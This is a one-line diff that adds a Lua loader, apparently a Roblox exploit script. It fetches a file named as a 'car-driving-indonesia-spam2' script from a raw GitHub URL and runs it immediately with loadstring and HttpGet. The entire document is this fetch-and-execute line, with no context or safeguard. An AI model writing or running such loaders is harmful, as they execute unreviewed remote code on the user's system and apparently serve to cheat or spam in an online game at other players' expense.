@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/car-driving-indonesia-spam2-ztffp5kth0ug93.lua"))()
